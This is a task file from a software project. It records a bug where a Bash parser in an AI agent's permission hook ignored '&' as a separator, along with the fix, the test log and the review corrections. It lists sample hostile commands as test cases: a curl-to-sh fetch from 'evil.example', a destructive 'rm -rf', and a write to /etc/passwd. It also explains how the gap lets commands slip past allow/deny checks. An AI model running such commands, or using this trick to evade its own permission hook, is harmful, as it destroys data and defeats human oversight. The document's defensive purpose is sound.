# Task 31 — `&` is not a command separator: everything after it is invisible to the validator (bug)

**Status:** done · **Type:** bug · **Created:** 2026-08-27 · **Rev:** 1
**Priority:** **critical — live on `main`, affects every Bash call, no trap or
newline needed**
**Suggested worker:** implement → review → fix loop, background agents
**Scope:** `.claude/hooks/bash_command_parser.py`, `tests/`, this file.
**Read first:** §1 · `tasks/22_agent_permission_flows/state.md` invariant 1
**Origin:** found by task 28's round-3 reviewer while auditing what the `trap`
handler validator inherits from the parser. Independently reproduced by the
manager against this repo's own merged settings (295 allow / 9 deny).

## 1. The defect

`bash_command_parser.py:23` — `OPERATORS = ['&&', '||', '|', ';']` — and `:856`,
whose single-character operator set is `('|', ';', '>', '<')`. **`&` appears in
neither.** A bare `&` is a command separator in bash: `cmd1 & cmd2` backgrounds
`cmd1` and runs `cmd2`. Both execute. The parser treats the whole string as
**one** sub-command whose head is `cmd1`, so `cmd2` is never classified against
any pattern.

Measured against this repo's live settings:

```
echo ok & rm -rf /home/anton/important        -> Decision: allow
echo ok & curl http://evil.example/a | sh     -> Decision: allow
true & nslookup example.com                   -> Decision: allow
echo ok; nslookup example.com                 -> Decision: ask     (control: ';' works)
```

And the split itself:

```
$ ... 'echo ok & nslookup example.com' --dry-run
Sub-commands: ['echo ok & nslookup example.com']
```

One sub-command. `nslookup` — which asks on its own — is invisible.

## 2. Why this is the most severe of the open parser bugs

- **No preconditions.** Tasks 25/28 needed a `SAFE_BUILTINS` head token; task 30
  needs an in-workspace target. This needs a prefix of any allowlisted command
  and one `&`. `true & <anything>` allows.
- **It is on `main` and installed.** Present on HEAD; nothing in task 28's
  uncommitted work touches it.
- **It defeats deny outright**, so epic 22 invariant 1 is false for any command
  reachable this way — which is all of them.
- It is also why `trap 'echo ok & rm -rf …' EXIT` allows: the handler validator
  inherits every fidelity gap the parser has. See §4.

## 3. The fix

Teach the parser that `&` separates commands, while keeping the three cases
where it does not:

1. `&&` — already an operator; must keep winning over a single `&`.
2. `>&`, `<&`, `2>&1`, `&>`, `>>&` — file-descriptor duplication and `&>`
   redirection. A `&` bound to a redirection is not a separator.
3. Inside quotes or `$(…)`/backticks — the existing quote/substitution state
   machine already governs this; make sure the new operator respects it.

A trailing `&` (`sleep 1 &`) backgrounds one command and must stay a single
sub-command with no empty second element.

**Do not** simply add `&` to the `:856` tuple without checking `:23` and the
tokenizer's lookahead for `&&` and `>&` — a naive edit turns `2>&1` into two
sub-commands and would break a large fraction of ordinary commands, which is a
worse outcome than the bug (H2 in task 27's sense: an over-tightened parser that
mis-splits ordinary work).

## 4. Relationship to the other open parser tasks

- **Task 28** (`SAFE_BUILTINS` / `trap`) — its round-3 review names this gap as
  the reason defect (b) is *narrowed, not closed*: handler validation can never
  be more faithful than the parser it delegates to. Task 28 should record that
  explicitly rather than claim `trap` is fully validated.
- **Task 30** (`workspace_binary` / `workspace_rm` / `local_function` outranking
  deny) — independent, same invariant.

**Sequencing: this one first.** It is live, unconditional, and both other tasks'
guarantees are stated in terms of "every sub-command is classified", which is
false until this lands.

## 5. Tests

`tests/` — parser-level and end-to-end. Each watched to fail first:

1. `echo ok & nslookup example.com` splits into two sub-commands and asks.
2. `echo ok & rm -rf /tmp/x` denies/asks per pattern rather than allowing.
3. A denied command after `&` denies (epic 22 D1).
4. **Regression floor — the three non-separator cases:** `a && b` stays two
   sub-commands split on `&&`; `cmd 2>&1`, `cmd >&2`, `cmd &> /tmp/f`,
   `cmd 2>&1 | tee f` are unchanged; `echo 'a & b'` and `$(echo a & b)` respect
   quoting/substitution.
5. `sleep 1 &` remains one sub-command, no empty tail.
6. Multiple: `a & b & c` splits into three.
7. Full suite green, before/after counts reported. Baseline when this task was
   filed: 1359 ran, OK, 1 skipped (`test_headless_spawn`) — **note that count
   includes task 28's uncommitted work**; re-baseline against whatever is in the
   tree when you start.

## 6. Constraints

- **Shared checkout.** Never `git checkout`/`stash`/`reset`/`restore`, with or
  without a pathspec. `cp` aside for mutation tests or work in a `/tmp` tree
  built with `git archive HEAD`.
- **A repo edit is not live.** Do not run `./install-claude-config.sh`; name the
  copy you tested.
- `bash_command_parser.py` is shared by every consumer of the normalized
  sub-command list. Check the blast radius across callers before changing the
  tokenizer, and report it.

## 7. Done criteria

1. `&` separates; the three non-separator cases and the trailing form are
   preserved.
2. §5's tests present and green, with the report naming which were watched to
   fail and what they printed.
3. Full suite green, counts reported.
4. A differential sweep over a corpus of ordinary commands showing what changed
   and in which direction — nothing may move toward `allow`.
5. This file updated with an implementation log.

---

## 8. Implementation log (rev 1 — implementer)

**Status:** done · **Landed:** 2026-08-27 · **Baseline commit:** `4f6a258`
**Not installed.** `./install-claude-config.sh` was not run; the copy tested is
the repo working tree at `/data/sync/work/leangeeks-ai/claude-hooks`. The
installed hooks under `~/.claude/hooks/` still carry the bug until someone
reinstalls.

### 8.1 What changed

`.claude/hooks/bash_command_parser.py`, two sites, both in the operator table:

1. **`:23` `OPERATORS`** → `['&&', '||', '|', ';', '&']`. This constant is
   documentation only (nothing reads it); updated so it does not contradict the
   tokenizer, with a comment naming the three non-separator shapes.
2. **`_check_operator` (`:849`, formerly `:856`)** — the real fix.
   - `'&>'` **added** to the multi-character list, positioned **after `'&>>'`**.
     It was missing entirely: `cmd &> /tmp/f` used to leak the `&` as a bare
     word (`['cmd &']`). Adding it is a **precondition** for the next change —
     without it, `cmd &> /tmp/f` would have split and `/tmp/f` would have become
     a bogus second sub-command.
   - `'&'` **added** to the single-character tuple: `('|', ';', '>', '<', '&')`.
   - A docstring paragraph records that **list order is load-bearing**: the list
     is scanned in order and first match wins, so `&&` (first) beats a lone `&`,
     `&>>` precedes `&>`, and the fd-dup forms are matched at the character that
     *starts* them (`2>&1`/`1>&2` whole, `>&` at the `>`, `<&` at the `<`) so
     their `&` is consumed before the single-character check is ever reached.

Nothing in `_split_on_operators`, `_normalize_command` or the tokenizer's state
machine needed to change: `&` classifies as `OP` (it is not in `REDIRECTIONS`),
so `emit_separator` reopens command position and the existing group-flush logic
gives the trailing form (`sleep 1 &`) one sub-command with no empty tail.

`tests/test_integration_pretool.py`:
- new `TestAmpersandIsACommandSeparator` (17 methods, 21 subtests);
- `_TASK_31_KNOWN_FAILING` **deleted** (all 8 entries retired, see §8.4);
- the `if tag in _TASK_31_KNOWN_FAILING: continue` skip removed from
  `test_validator_verdict_matches_the_handler_bash_registered`, so the
  real-bash property is now enforced over the **whole** 240-case corpus;
- `test_task_31_known_failing_list_is_exact` replaced by
  `test_amp_pre_cases_satisfy_the_property`, which keeps a floor under `&`
  coverage (≥8 `amp-pre` cases must exist and each must contain a real `&`), so
  the property cannot become vacuously true for `&` by the context being
  dropped from `_TRAP_CONTEXTS`.

`bash_command_parser.py`'s own `__main__` behaviour table gained 8 `&` rows
(107 passed / 0 failed).

### 8.2 Blast radius (§6 third bullet)

Everything downstream of `_tokenize_with_quotes` / `_split_on_operators`:

| Consumer | Effect |
|---|---|
| `parse_compound_command` / `parse_with_offsets` | more sub-commands where a `&` was hiding one; offsets unchanged for existing tokens |
| `pretool_hook.BashPermissionValidator.validate_bash_command` (`:559`) | the tail after a `&` is now classified — the fix |
| `extract_assignments` (`:899`) | a standalone `X=1 & Y=2` now yields both assignments instead of one bogus `&` group (it used to normalize to `['&']`) |
| `extract_write_redirect_targets` / `_scan_write_targets` | `&>`/`&>>` targets now come from a `REDIRECT '&>'` token instead of the accidental `WORD '&'` + `REDIRECT '>'` path. Same target string; the reported **offset moves earlier** (points at the `&`, not the `>`), which only makes `_expand_constants`' "assignment must lexically precede the use" test *stricter*. |
| `pretool_hook._raw_token_values` / `_matching_raw_handler_tokens` / `_recover_raw_handler` (task 28) | re-tokenization now emits an `OP '&'` where a `WORD '&'` used to be; handler recovery matches single-token values, so a bare `&` was never a candidate either way. A `trap` sitting after a `&` is now *reached at all* — that is what retired the 8 pinned cases. |
| `permissions-mcp/permissions_mcp_lib.py:202`, `telegram_permission_router.py:408` | construct the same validator; inherit the change with no code edit |
| `tests/scenario_check.py` | same |

`SAFE_BUILTINS` / `NOOP` reduction, the `[[ ]]` conditional path, the `case`
state machine, heredocs and process substitution are untouched.

### 8.3 Tests watched to fail first

Run against the pre-fix parser: **16 failed, 1 passed, 21 subtests passed**.
The one that passed is `test_non_separator_forms_are_unchanged` — the §5.4
regression floor. It is a **guard**, green before and after; it was never
watched to fail and nothing here claims otherwise.

Representative pre-fix output:

```
test_amp_splits_into_two_sub_commands
  AssertionError: Lists differ: ['echo ok & nslookup example.com']
                             != ['echo ok', 'nslookup example.com']

test_allowlisted_head_does_not_launder_the_tail   ("true & <anything>")
  AssertionError: 'allow' != 'ask'

test_denied_command_after_amp_denies              (epic 22 D1)
  AssertionError: 'allow' != 'deny'

test_trailing_amp_is_one_sub_command_with_no_empty_tail
  AssertionError: Lists differ: ['sleep 1 &'] != ['sleep 1']

test_three_backgrounded_commands_split_three_ways
  AssertionError: Lists differ: ['a & b & c'] != ['a', 'b', 'c']

test_ampersand_redirect_operator_is_recognised
  AssertionError: Lists differ: ['cmd &'] != ['cmd']

test_trap_after_amp_is_reached_by_the_handler_validator
  AssertionError: 'allow' == 'allow'
```

Post-fix: 17 passed, 21 subtests passed.

The regression floor pins 21 forms verbatim, including the pre-existing fd-dup
quirks it must NOT disturb (`cmd >&2 -> ['cmd 2']`, `cmd 3>&1 -> ['cmd 3 1']`,
`cmd 0<&3 -> ['cmd 0 3']`, `cmd 2>&- -> ['cmd 2 -']`), plus `&&`, `2>&1`,
`&>>`, quoting, `[[ ]]`, a heredoc body and a `case` pattern.

### 8.4 The real-bash oracle — `_TASK_31_KNOWN_FAILING` retired in full

All **8** pinned tags stopped violating the property in the same pass, and **0**
unlisted cases took their place:

```
NOW PASSES  plain-deny/single/EXIT/none/amp-pre       cmd=deny  handler=deny
NOW PASSES  plain-deny/double/EXIT/none/amp-pre       cmd=deny  handler=deny
NOW PASSES  newline/single/EXIT/none/amp-pre          cmd=deny  handler=deny
NOW PASSES  newline/double/EXIT/none/amp-pre          cmd=deny  handler=deny
NOW PASSES  plain-ask/single/EXIT+INT/none/amp-pre    cmd=ask   handler=ask
NOW PASSES  plain-ask/double/EXIT+INT/none/amp-pre    cmd=ask   handler=ask
NOW PASSES  blank-indent/single/TERM/none/amp-pre     cmd=deny  handler=deny
NOW PASSES  newline/single/TERM/post/amp-pre          cmd=deny  handler=deny
now passing: 8   still failing: 0   unlisted violations: 0
```

`TestTrapHandlerAgainstRealBash`: 6 passed, **275** subtests (was 245 — the
property now covers all 240 cases with no exemptions).

This closes the §4 caveat task 28 had to record: `trap` handler validation is
no longer blind to a handler placed after a `&`.

### 8.5 Differential sweep (§7 item 4)

Corpus: **2118** distinct commands — 2062 real ones harvested from this
machine's `~/.claude/bash_hook_debug.log*` (`Validating command:` lines,
including the rotated `.gz` archives) and `~/.claude/permission_requests.jsonl`,
plus 56 curated ordinary/dev commands covering every `&`-bearing redirection
form. **1580** of them contain a `&`.

Fixture verified through `SettingsLoader.load_all_settings()` before trusting a
result: **allow=295, deny=9, ask=0** — the same numbers the task was filed
against.

```
corpus size:               2118
verdict changed:           1
sub-command split changed: 91
  allow -> ask     1
MOVED TOWARD allow:        0
split changes on commands WITHOUT '&':      0
commands that ended up with FEWER sub-commands: 0
```

**One ordinary command changed verdict**, and it moved toward `ask`:

```
'(( a & b ))'   allow -> ask
   pre : ['(( a & b ))']       post: ['(( a', 'b']
```

See §8.7 for why this is accepted rather than suppressed. Every other change is
a finer split with the same verdict, e.g.

```
'npm run dev &'            ['npm run dev &']            -> ['npm run dev']
'python3 server.py & sleep 2'  ['python3 server.py & sleep 2'] -> ['python3 server.py', 'sleep 2']
'command -v amux-spawn &>/dev/null'  ['command -v amux-spawn &'] -> ['command -v amux-spawn']
```

### 8.6 Ground truth against real bash

19 inert cases (`printf`/`echo`/`pwd`/`true` only, in a scratch dir) run under
`set -T` + a `DEBUG` trap that records `$BASH_COMMAND`, i.e. exactly the list of
commands bash executes separately. **19/19** matched the parser's sub-command
count, including `printf a & printf b` (2), `printf a &` (1),
`printf a & printf b & printf c` (3), `printf a & true; pwd` (3), and every
redirection form (`2>&1`, `>&2`, `3>&1`, `&>`, `&>>`, `> f 2>&1`) at 1 each.

### 8.7 Decisions differing from the brief

1. **`((…))` is deliberately NOT suppressed.** The brief asked to check whether
   the state machine governs `((…))`; **it does not, and it did not before this
   task either** — `(( a && b ))` already split into `['(( a', 'b']` on HEAD.
   Adding an `in_arith` suppression would have been a *loosening* of a
   construct the parser cannot reliably tell from a nested subshell `( (…) )`,
   which is a bypass risk; splitting is direction-safe (the `((` fragment is
   still recognised as a no-op and the tail is classified, i.e. toward `ask`).
   Cost measured: exactly one command in a 2118-command corpus, `(( a & b ))`,
   moved `allow -> ask`. Zero real-world commands in the harvested corpus were
   affected. Left as a separate, lower-severity parser gap.
2. **`&>` had to be added first.** The brief lists `&>` among the forms to
   preserve, but it was never in `_check_operator` at all — the naive edit would
   have split it. Adding it is part of the fix, not incidental cleanup.
3. **`test_rm_after_amp_does_not_allow` (§5.2) uses an out-of-workspace path.**
   With `workspace_dir="/tmp"`, `echo ok & rm -rf /tmp/x` still verdicts `allow`
   after the fix — the split is correct (`['echo ok', 'rm -rf /tmp/x']`) and the
   `workspace_rm` tier allows the `rm` on its own merits. That is
   **tasks/30**, not this bug; the test asserts the split explicitly and uses
   `/home/anton/important` for the verdict half.
4. **`_TASK_31_KNOWN_FAILING` removed rather than left empty**, together with
   its now-dead skip branch, and replaced by a positive `amp-pre` floor test.
   Net test count is unchanged by the swap.

### 8.8 Residual risk

- **Not installed.** `~/.claude/hooks/bash_command_parser.py` still has the bug
  until `./install-claude-config.sh` runs.
- **`(( … & … ))` mis-splits** (§8.7 item 1). Direction-safe (toward `ask`),
  pre-existing for `&&`, measured at 1/2118.
- **The fd-dup word leak is untouched**: `cmd >&2 -> ['cmd 2']`,
  `cmd 3>&1 -> ['cmd 3 1']`. The stray digits are extra *arguments* on an
  existing sub-command, never a new head, so they cannot allow anything; pinned
  verbatim by the regression floor so a future edit must notice them.
- **`|&`** (bash's `2>&1 |` shorthand) now splits correctly as a side effect
  (`cmd |& grep x -> ['cmd', 'grep x']`, previously `['cmd', '& grep x']`).
  Not separately covered by a named test.
- **The brief's second measured bypass is now a settings finding, not a parser
  one.** `echo ok & curl http://evil.example/a | sh` still verdicts `allow`
  against this repo's live settings — but the split is now correct
  (`['echo ok', 'curl http://evil.example/a', 'sh']`) and the verdict comes
  from `Bash(curl:*)` and `Bash(sh:*)` both being explicitly allowlisted. The
  identical command with the `&` removed allows too. Nothing is hidden any
  more; whether `curl:* | sh:*` should be allowlisted is a policy question for
  the operator, outside this task.

---

## 8.9 Review corrections (2026-08-27)

The shipped code passed review unchanged. Three claims in the log above did
**not** survive it and are corrected here rather than edited away, per this
epic's convention for overclaims (see task 28 §5's struck bullets).

1. **"`&>` was a precondition" — false.** Mutation-proved: deleting `'&>'` from
   the multi-char list while keeping `'&'` in the single-char tuple leaves the
   full suite green and the parser self-test at 107/0, because the `&` emits
   `OP`, the `>` emits `REDIRECT`, `_split_on_operators` consumes the target and
   the empty group is dropped. The only observable difference across 2073
   commands is `cmd &> f ARG` (`['cmd ARG']` vs `['cmd', 'ARG']`) — a real but
   small precision gain that fails toward `ask` when absent. The addition is
   correct and worth keeping; it was not load-bearing, and **no test pins it** —
   `test_ampersand_redirect_operator_is_recognised` passes without it.

2. **"the `&>` target's offset moves earlier" — false.** Differential over 2069
   commands: **0 differences in value or offset**. `_scan_write_targets` records
   the *target token's* offset, not the redirect's, and that is identical on
   both paths. The conclusion drawn from it (the write-destination gate is
   untouched) is right; the mechanism cited for it does not happen.

3. **"nothing moved toward allow" — true of the harvested corpus, not a
   property of the change.** Confirmed on 2061 real commands (0 verdict changes,
   0 toward allow). But a systematic scan over 10 allowlisted heads × 10 `&`
   placements finds **36 `ask` → `allow`** transitions — `ls&`, `pwd &`,
   `true&FOO=1` — plus a second class where an assignment previously hidden
   behind a `&` now feeds `_expand_constants` (`GIT=/usr/bin/git & $GIT status`
   goes ask → allow). **Every one is bash-faithful**: `cmd&` runs exactly `cmd`,
   and the `;` control gives the same verdict. So there is no regression, but
   the defensible claim is *"every move toward allow is bash-faithful"*, not
   *"there are none"*. Done criterion 4 should be read that way.

Also recorded, not fixed:

- **Half the "ORDER IS LOAD-BEARING" docstring is vacuous.** `&>>` before `&>`
  is genuinely load-bearing and test-pinned (swapping them fails 3 tests).
  `&&` before `&` is **not enforced by anything** — returning `'&'` before the
  multi-char scan leaves the suite green, because `_split_on_operators` drops
  the empty group between two consecutive `&` OPs. The invariant is true but
  inconsequential, and a future edit violating it would not be caught.
- **`>& file` is still broken and now asymmetric.** `>&` sits in
  `REDIRECTIONS_NO_ARG`, but in bash `>& file` is an exact synonym for
  `&> file`. So `cmd >& /tmp/f` yields `['cmd /tmp/f']` and
  `extract_write_redirect_targets` returns `[]` — i.e. `echo x >& /etc/passwd`
  is invisible to the write-destination gate. Pre-existing; worth folding into
  the task 32 sweep.
- `test_amp_pre_cases_satisfy_the_property`'s floor is `>= 8` against a current
  population of **22**; a 60% erosion would pass unnoticed. Worth tightening.
- `architecture.md:37` still lists the splitter as `(|, &&, ||, ;, …)`.

**Separator-completeness matrix (review evidence).** Across 25 syntactic
contexts, `&` now separates wherever `;` does in **24/25** — the sole exception
being the mid-word `#` case, which hides for `;` equally. That is the result
that says this task is done and the remainder is a different bug: see task 32.
